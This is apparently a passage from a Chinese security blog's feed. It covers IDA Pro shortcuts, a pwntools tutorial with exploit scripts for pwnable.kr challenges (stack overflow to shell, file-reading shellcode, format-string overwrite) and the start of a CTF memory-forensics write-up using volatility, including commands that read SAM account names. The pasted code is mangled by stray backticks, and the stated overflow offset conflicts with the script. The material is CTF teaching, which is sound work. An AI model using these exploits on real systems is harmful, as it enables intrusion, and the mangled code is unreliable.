registers</td><td>Shift+F8</td></tr><tr><td>Signatures</td><td>Shift+F5</td></tr><tr><td>Type libraries</td><td>Shift+F11</td></tr><tr><td>Structures</td><td>Shift+F9</td></tr><tr><td>Enumerations</td><td>Shift+F10</td></tr></tbody></table><hr><p>Data Format Options</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>ASCII strings style</td><td>Alt+A</td><td></td></tr><tr><td>Setup data types</td><td>Alt+D</td><td></td></tr></tbody></table><hr><p>File Operations</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Parse C header file</td><td>Ctrl+F9</td><td></td></tr><tr><td>Create ASM file</td><td>Alt+F10</td><td></td></tr><tr><td>Save database</td><td>Ctrl+W</td><td></td></tr></tbody></table><hr><p>Navigation</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Jump to operand</td><td>Enter</td><td></td></tr><tr><td>Jump in new window</td><td>Alt+Enter</td><td></td></tr><tr><td>Jump to previous position</td><td>Esc</td><td></td></tr><tr><td>Jump to next position</td><td>Ctrl+Enter</td><td></td></tr><tr><td>Jump to address</td><td>G</td><td></td></tr><tr><td>Jump by name</td><td>Ctrl+L</td><td></td></tr><tr><td>Jump to function</td><td>Ctrl+P</td><td></td></tr><tr><td>Jump to segment</td><td>Ctrl+S</td><td></td></tr><tr><td>Jump to segment register</td><td>Ctrl+G</td><td></td></tr><tr><td>Jump to problem</td><td>Ctrl+Q</td><td></td></tr><tr><td>Jump to cross reference</td><td>Ctrl+X</td><td></td></tr><tr><td>Jump to xref to operand</td><td>X</td><td></td></tr><tr><td>Jump to entry point</td><td>Ctrl+E</td><td></td></tr><tr><td>Mark Position</td><td>Alt+M</td><td></td></tr><tr><td>Jump to marked position</td><td>Ctrl+M</td><td></td></tr></tbody></table><hr><p>Debugger</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Start process</td><td>F9</td><td></td></tr><tr><td>Terminate process</td><td>Ctrl+F2</td><td></td></tr><tr><td>Step into</td><td>F7</td><td></td></tr><tr><td>Step over</td><td>F8</td><td></td></tr><tr><td>Run until return</td><td>Ctrl+F7</td><td></td></tr><tr><td>Run to cursor</td><td>F4</td><td></td></tr></tbody></table><hr><p>Breakpoints</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Breakpoint list</td><td>Ctrl+Alt+B</td><td></td></tr></tbody></table><hr><p>Watches</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Delete watch</td><td>Del</td><td></td></tr></tbody></table><hr><p>Tracing</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Stack trace</td><td>Ctrl+Alt+S</td><td></td></tr></tbody></table><hr><p>Search</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Next code</td><td>Alt+C</td><td></td></tr><tr><td>Next data</td><td>Ctrl+D</td><td></td></tr><tr><td>Next explored</td><td>Ctrl+A</td><td></td></tr><tr><td>Next unexplored</td><td>Ctrl+U</td><td></td></tr><tr><td>Immediate value</td><td>Alt+I</td><td></td></tr><tr><td>Next immediate value</td><td>Ctrl+I</td><td></td></tr><tr><td>Text</td><td>Alt+T</td><td></td></tr><tr><td>Next text</td><td>Ctrl+T</td><td></td></tr><tr><td>Sequence of bytes</td><td>Alt+B</td><td></td></tr><tr><td>Next sequence of bytes</td><td>Ctrl+B</td><td></td></tr><tr><td>Not function</td><td>Alt+U</td><td></td></tr><tr><td>Next void</td><td>Ctrl+V</td><td></td></tr><tr><td>Error operand</td><td>Ctrl+F</td><td></td></tr></tbody></table><hr><p>Graphing</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Flow chart</td><td>F12</td><td></td></tr><tr><td>Function calls</td><td>Ctrl+F12</td><td></td></tr></tbody></table><hr><p>Miscellaneous</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Calculator</td><td>?</td><td></td></tr><tr><td>Cycle through open views</td><td>Ctrl+Tab</td><td></td></tr><tr><td>Select tab</td><td>Alt + [1…N]</td><td></td></tr><tr><td>Close current view</td><td>Ctrl+F4</td><td></td></tr><tr><td>Exit</td><td>Alt+X</td><td></td></tr><tr><td>IDC Command</td><td>Shift+F2</td><td></td></tr></tbody></table><hr><p>Edit (Data Types – etc)</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Copy</td><td>Ctrl+Ins</td><td></td></tr><tr><td>Begin selection</td><td>Alt+L</td><td></td></tr><tr><td>Manual instruction</td><td>Alt+F2</td><td></td></tr><tr><td>Code</td><td>C</td><td></td></tr><tr><td>Data</td><td>D</td><td></td></tr><tr><td>Struct variable</td><td>Alt+Q</td><td></td></tr><tr><td>ASCII string</td><td>A</td><td></td></tr><tr><td>Array</td><td>Num *</td><td></td></tr><tr><td>Undefine</td><td>U</td><td></td></tr><tr><td>Rename</td><td>N</td><td></td></tr></tbody></table><hr><p>Operand Type</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Offset (data segment)</td><td>O</td><td></td></tr><tr><td>Offset (current segment)</td><td>Ctrl+O</td><td></td></tr><tr><td>Offset by (any segment)</td><td>Alt+R</td><td></td></tr><tr><td>Offset (user-defined)</td><td>Ctrl+R</td><td></td></tr><tr><td>Offset (struct)</td><td>T</td><td></td></tr><tr><td>Number (default)</td><td>#</td><td></td></tr><tr><td>Hexadecimal</td><td>Q</td><td></td></tr><tr><td>Decimal</td><td>H</td><td></td></tr><tr><td>Binary</td><td>B</td><td></td></tr><tr><td>Character</td><td>R</td><td></td></tr><tr><td>Segment</td><td>S</td><td></td></tr><tr><td>Enum member</td><td>M</td><td></td></tr><tr><td>Stack variable</td><td>K</td><td></td></tr><tr><td>Change sign</td><td>Underscore (_)</td><td></td></tr><tr><td>Bitwise negate</td><td>~</td><td></td></tr><tr><td>Manual</td><td>_ Alt+F1</td><td></td></tr></tbody></table><hr><p>Comments</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Enter comment</td><td>:</td><td></td></tr><tr><td>Enter repeatable comment</td><td>;</td><td></td></tr><tr><td>Enter anterior lines</td><td>Ins</td><td></td></tr><tr><td>Enter posterior lines</td><td>Shift+Ins</td><td></td></tr><tr><td>Insert predefined comment</td><td>Shift+F1</td><td></td></tr></tbody></table><hr><p>Segments</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Edit segment</td><td>Alt+S</td><td></td></tr><tr><td>Change segment register value</td><td>Alt+G</td><td></td></tr></tbody></table><hr><p>Structs</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Struct var</td><td>Alt+Q</td><td></td></tr><tr><td>Force zero offset field</td><td>Ctrl+Z</td><td></td></tr><tr><td>Select union member</td><td>Alt+Y</td><td></td></tr></tbody></table><hr><p>Functions</p><table><thead><tr><th>窗口名称</th><th>快捷键</th><th>备注</th></tr></thead><tbody><tr><td>Create function</td><td>P</td><td></td></tr><tr><td>Edit function</td><td>Alt+P</td><td></td></tr><tr><td>Set function end</td><td>E</td><td></td></tr><tr><td>Stack variables</td><td>Ctrl+K</td><td></td></tr><tr><td>Change stack pointer</td><td>Alt+K</td><td></td></tr><tr><td>Rename register</td><td>V</td><td></td></tr><tr><td>Set function type</td><td>Y</td><td></td></tr></tbody></table><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PWNTOOLS的使用</title>
      <link href="/2019/09/14/PWNTOOLS%E2%95%A1%E2%94%80%E2%95%A9%E2%95%A3%E2%95%99%E2%94%9C/"/>
      <url>/2019/09/14/PWNTOOLS%E2%95%A1%E2%94%80%E2%95%A9%E2%95%A3%E2%95%99%E2%94%9C/</url>
      
        <content type="html"><![CDATA[<p><strong>pwntools</strong>是一个二进制利用框架。官方文档提供了详细的<strong>api</strong>规范。由于本文只是用来介绍<strong>pwntools</strong>使用方法，不会过于详细的讲解各种二进制漏洞攻击技术。</p><h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;``#include &lt;string.h&gt;``#include &lt;stdlib.h&gt;``void func(``int` `key)&#123;``    ``char overflowme[``32``];``    ``printf(``&quot;overflow me : &quot;``);``    ``gets(overflowme);    ``/``/` `smash me!``    ``if``(key ``=``=` `0xcafebabe``)&#123;``        ``system(``&quot;/bin/sh&quot;``);``    ``&#125;``    ``else``&#123;``        ``printf(``&quot;Nah..\n&quot;``);``    ``&#125;``&#125;``int` `main(``int` `argc, char``*` `argv[])&#123;``    ``func(``0xdeadbeef``);``    ``return` `0``;``&#125;</span><br></pre></td></tr></table></figure><p>pwntools脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*``c ``=` `remote(``&quot;pwnable.kr&quot;``, ``9000``) ``c.sendline(``&quot;AAAA&quot;` `*` `13` `+` `p32(``0xcafebabe``))``c.interactive()</span><br></pre></td></tr></table></figure><p>源码简洁明了，我们只需要将<strong>key</strong>改写成<code>0xcafebabe</code>。</p><p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p><p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code> 会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 <code>c</code>). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p><ul><li><code>send(payload)</code> 发送payload</li><li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li><li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li><li><code>recvn(N)</code> 接受 N(数字) 字符</li><li><code>recvline()</code> 接收一行输出</li><li><code>recvlines(N)</code> 接收 N(数字) 行输出</li><li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li></ul><p>在第三行中, <code>p32()</code> 可以让我们转换整数到小端序格式. <code>p32</code> 转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到<strong>key</strong>的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。</p><p>最后，我们成功getshell了. 这时，你可能想发送命令进行交互. <code>c.interactive()</code> 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 .</p><p><img src="https://bbs.pediy.com/upload/attach/201901/3_3KDCPDBYDBFWSMH.png" alt="图片描述"></p><h2 id="写-Shellcode"><a href="#写-Shellcode" class="headerlink" title="写 Shellcode"></a>写 Shellcode</h2><p>下一题是pwnable.kr的asm. 你需要用 <code>ssh -p2222 asm@pwnable.kr</code> 并输入密码 <code>guest</code> 来查看可执行文件和源码. 这里，我们只展示利用代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*` `p ``=` `process(``&quot;./asm&quot;``)``context.log_level ``=` `&apos;DEBUG&apos;``gdb.attach(p)` `context(arch``=``&apos;amd64&apos;``, os``=``&apos;linux&apos;``)` `shellcode ``=` `shellcraft.amd64.pushstr(``&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;``)``shellcode ``+``=` `shellcraft.amd64.linux.``open``(``&apos;rsp&apos;``,``0``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.read(``&apos;rax&apos;``,``&apos;rsp&apos;``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.write(``1``, ``&apos;rsp&apos;``, ``100``)` `p.recvuntil(``&apos;shellcode: &apos;``)``p.send(asm(shellcode))``log.success(p.recvall())</span><br></pre></td></tr></table></figure><p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br><code>process</code> 和 <code>remote</code> 累死.  <code>remote</code> 连接远程主机, <code>process</code> 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, <code>process</code> 返回的对象可以通过 <code>gdb.attach(p)</code> 将进程attach到gdb上. Attach 之后,  gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).</p><p><img src="https://bbs.pediy.com/upload/attach/201901/3_QGGWTB3XTZ6JTC5.png" alt="图片描述"></p><blockquote><p>提醒一下，如果你想在命令行中使用gdb.attach(), 便需要安装并运行 tmux. <a href="https://hackernoon.com/a-gentle-introduction-to-tmux-8d784c404340" target="_blank" rel="noopener">更多关于tmux的信息</a>.</p></blockquote><p>当我们想查看服务器输出时，并不需要在每个 <code>recvline</code> 或者 <code>recvuntil</code> 前加 <code>print</code>. 当 <code>context.log_level</code> 被设置为 <code>&quot;DEBUG&quot;</code> , 我们的输入和服务器的输出会被直接输出.</p><p><code>shellcraft</code> 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 <em>open</em> 了一个文件并 <em>read</em> 文件到 <em>stdout</em>. 关于这个类更多的文档, 你可以查阅 <a href="http://docs.pwntools.com/en/stable/shellcraft.html" target="_blank" rel="noopener">官方文档</a>.</p><h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*``import` `tempfile` `program ``=` `tempfile.mktemp()``source  ``=` `program ``+` `&quot;.c&quot;``write(source, ``&apos;&apos;&apos;``#include &lt;stdio.h&gt;``#include &lt;stdlib.h&gt;``#include &lt;unistd.h&gt;``#include &lt;sys/mman.h&gt;``#define MEMORY_ADDRESS ((void*)0x11111000)``#define MEMORY_SIZE 1024``#define TARGET ((int *) 0x11111110)``int main(int argc, char const *argv[])``&#123;``       ``char buff[1024];``       ``void *ptr = NULL;``       ``int *my_var = TARGET;``       ``ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);``       ``if(ptr != MEMORY_ADDRESS)``       ``&#123;``               ``perror(&quot;mmap&quot;);``               ``return EXIT_FAILURE;``       ``&#125;``       ``*my_var = 0x41414141;``       ``write(1, &amp;my_var, sizeof(int *));``       ``scanf(&quot;%s&quot;, buff);``       ``dprintf(2, buff);``       ``write(1, my_var, sizeof(int));``       ``return 0;``&#125;&apos;&apos;&apos;``)``cmdline ``=` `[``&quot;gcc&quot;``, source, ``&quot;-Wno-format-security&quot;``, ``&quot;-m32&quot;``, ``&quot;-o&quot;``, program]``process(cmdline).wait_for_close()``def` `exec_fmt(payload):``    ``p ``=` `process(program)``    ``p.sendline(payload)``    ``return` `p.recvall()` `autofmt ``=` `FmtStr(exec_fmt)``offset ``=` `autofmt.offset``p ``=` `process(program, stderr``=``PIPE)``addr ``=` `u32(p.recv(``4``))``payload ``=` `fmtstr_payload(offset, &#123;addr: ``0x1337babe``&#125;)``p.sendline(payload)``print` `hex``(unpack(p.recv(``4``)))</span><br></pre></td></tr></table></figure><p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址: <code>{address1: value1, address2:value2,..., address: valueN}</code>.</p><p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload <a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">fmtstr_payload</a>.</p><h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*` `e ``=` `ELF(``&apos;./example_file&apos;``)``print` `hex``(e.address)  ``# 0x400000``print` `hex``(e.symbols[``&apos;write&apos;``]) ``# 0x401680``print` `hex``(e.got[``&apos;write&apos;``]) ``# 0x60b070``print` `hex``(e.plt[``&apos;write&apos;``]) ``# 0x401680``offset ``=` `e.symbols[``&apos;system&apos;``] ``-` `e.symbols[``&apos;printf&apos;``] ``# calculate offset``binsh_address ``=` `next``(e.search(``&apos;/bin/sh\x00&apos;``)) ``# find address which contains /bin/sh</span><br></pre></td></tr></table></figure><p>和 <code>process()</code> 一样, 我们只用将路径给 <code>ELF(path)</code> 即可分析 ELF.</p><p>我们有以下几种方法操纵ELF:</p><ul><li><code>symbols[&#39;a_function&#39;]</code> 找到 <code>a_function</code> 的地址</li><li><code>got[&#39;a_function&#39;]</code> 找到 <code>a_function</code>的 got </li><li><code>plt[&#39;a_function&#39;]</code> 找到 <code>a_function</code> 的 plt</li><li><code>next(e.search(&quot;some_characters&quot;))</code> 找到包含 <code>some_characters</code>（字符串，汇编代码或者某个数值）的地址. </li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Pwntools 是一套十分强大的工具. 在本文中, 我介绍了最常用的几个api, 但 pwntools 还有很多其他强大的api，诸如 qemu, adb. 各位可通过官方文档进行剩余的学习</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>护网杯2019-MISC-baby_forensic</title>
      <link href="/2019/09/10/%E2%95%97%C3%B1%E2%95%90%C2%B0%E2%96%92%C2%A12019-MISC-baby-forensic/"/>
      <url>/2019/09/10/%E2%95%97%C3%B1%E2%95%90%C2%B0%E2%96%92%C2%A12019-MISC-baby-forensic/</url>
      
        <content type="html"><![CDATA[<p>这是一题以内存取证为主题，包含着密码学和USB流量分析的杂项题，还是很有趣的，首先我们拿到了一个名为<strong>data.vmem</strong>的内存文件，可以知道这就是内存取证的题目</p><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>我们需要使用到一个叫做<strong>volatility</strong>的内存取证神器</p><p><strong>Volatility</strong>是开源的<strong>Windows</strong>，<strong>Linux</strong>，<strong>macOS</strong>，<strong>Android</strong>的内存取证分析工具，由<strong>Python</strong>编写成，命令行操作，支持各种操作系统</p><h3 id="使用Volatility"><a href="#使用Volatility" class="headerlink" title="使用Volatility"></a>使用Volatility</h3><p>判断镜像信息，获取操作系统类型</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ?.img/raw/... imageinfo</span><br></pre></td></tr></table></figure><p>知道操作系统类型后，用<code>--profile</code>指定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ?.img --profile=...</span><br></pre></td></tr></table></figure><p>查看当前显示的notepad文本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile=WinXPSP2x86 notepad</span><br></pre></td></tr></table></figure><p>查看当前运行的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile=WinXPSP2x86 psscan/pslist</span><br></pre></td></tr></table></figure><p>扫描所有的文件列表(常常结合grep)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile=WinXPSP2x86 filescan</span><br></pre></td></tr></table></figure><p>常常配合的grep为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| grep "doc\|docx\|rtf" //查看文档</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| grep "jpg\|jpeg\|png\|tif\|gif\|bmp"//查看图片</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| grep "Desktop"//查看桌面</span><br></pre></td></tr></table></figure><p>根据offset提取出文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile=WinXPSP2x86 dumpfiles -D . -Q 0x.....</span><br></pre></td></tr></table></figure><p>扫描 Windows 的服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile=WinXPSP2x86 svcscan</span><br></pre></td></tr></table></figure><p>查看网络连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile=WinXPSP2x86 connscan</span><br></pre></td></tr></table></figure><p>查看命令行上的操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile=WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure><p>根据pid dump出相应的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f easy_dump.img --profile=Win7SP1x64 memdump -p 2580 -D 目录</span><br></pre></td></tr></table></figure><p>查看截图</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile=Win7SP1x64 screenshot --dump-dir=.</span><br></pre></td></tr></table></figure><p>获取 IE 浏览器的使用情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 iehistory</span><br></pre></td></tr></table></figure><p>列举缓存在内存的注册表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 hivelist</span><br></pre></td></tr></table></figure><p>打印出注册表中的数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 hivedump -o 注册表的 virtual 地址</span><br></pre></td></tr></table></figure><p>获取SAM表中的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 printkey -K “SAM\Domains\Account\Users\Names”</span><br></pre></td></tr></table></figure><p>获取最后登录系统的账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 printkey -K “SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”</span><br></pre></td></tr></table></figure><p>提取出内存中记录的 当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 userassist</span><br></pre></td></tr></table></figure><h3 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h3><h4 id="获取镜像信息"><a href="#获取镜像信息" class="headerlink" title="获取镜像信息"></a>获取镜像信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/root/文档/baby_forensic/data.vmem)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0xb18000L</span><br><span class="line">                          KDBG : 0x80546ae0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 3</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2019-09-04 14:28:47 UTC+0000</span><br><span class="line">     Image local date and time : 2019-09-04 22:28:47 +0800</span><br></pre></td></tr></table></figure><p>可以知道这个镜像是WindowsXP的内存镜像我们接下来继续取证</p><h4 id="搜索进程"><a href="#搜索进程" class="headerlink" title="搜索进程"></a>搜索进程</h4><p>首先我们要看一下出题人在镜像里干了什么</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          </span><br><span class="line">---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class="line">0x817bd830 System                    4      0     58      173 ------      0                                                              </span><br><span class="line">0x8163eb88 smss.exe                372      4      3       19 ------      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x814229d8 csrss.exe               460    372     10      400      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x813c1020 winlogon.exe            484    372     24      462      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x81560020 services.exe            668    484     16      270      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x812b7cd0 lsass.exe               680    484     25      359      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x816c8cc8 vmacthlp.exe            836    668      1       25      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x81333b38 svchost.exe             848    668     21      201      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x812fa020 svchost.exe             932    668     11      263      0      0 2019-09-04 14:27:47 UTC+0000                                 </span><br><span class="line">0x80ed83c0 svchost.exe            1028    668     71     1193      0      0 2019-09-04 14:27:47 UTC+0000                                 </span><br><span class="line">0x81559020 svchost.exe            1072    668      5       59      0      0 2019-09-04 14:27:47 UTC+0000                                 </span><br><span class="line">0x81330020 svchost.exe            1116    668     15      201      0      0 2019-09-04 14:27:47 UTC+0000                                 </span><br><span class="line">0x81433420 explorer.exe           1428   1392     15      370      0      0 2019-09-04 14:27:48 UTC+0000                                 </span><br><span class="line">0x81323c20 spoolsv.exe            1564    668     15      138      0      0 2019-09-04 14:27:48 UTC+0000                                 </span><br><span class="line">0x815f2020 svchost.exe            1976    668      5       88      0      0 2019-09-04 14:28:05 UTC+0000                                 </span><br><span class="line">0x815f1da0 VGAuthService.e         188    668      2       60      0      0 2019-09-04 14:28:05 UTC+0000                                 </span><br><span class="line">0x81542da0 vmtoolsd.exe            256    668      9      266      0      0 2019-09-04 14:28:05 UTC+0000                                 </span><br><span class="line">0x80e848b0 wmiprvse.exe            988    848      9      190      0      0 2019-09-04 14:28:13 UTC+0000                                 </span><br><span class="line">0x80e81020 alg.exe                1172    668      7      110      0      0 2019-09-04 14:28:14 UTC+0000                                 </span><br><span class="line">0x81534020 rundll32.exe           1220   1428      4       78      0      0 2019-09-04 14:28:14 UTC+0000                                 </span><br><span class="line">0x815ddda0 vmtoolsd.exe           1660   1428      7      175      0      0 2019-09-04 14:28:14 UTC+0000                                 </span><br><span class="line">0x80e7b020 ctfmon.exe             1668   1428      1       71      0      0 2019-09-04 14:28:14 UTC+0000                                 </span><br><span class="line">0x80eaab78 wscntfy.exe            1088   1028      1       39      0      0 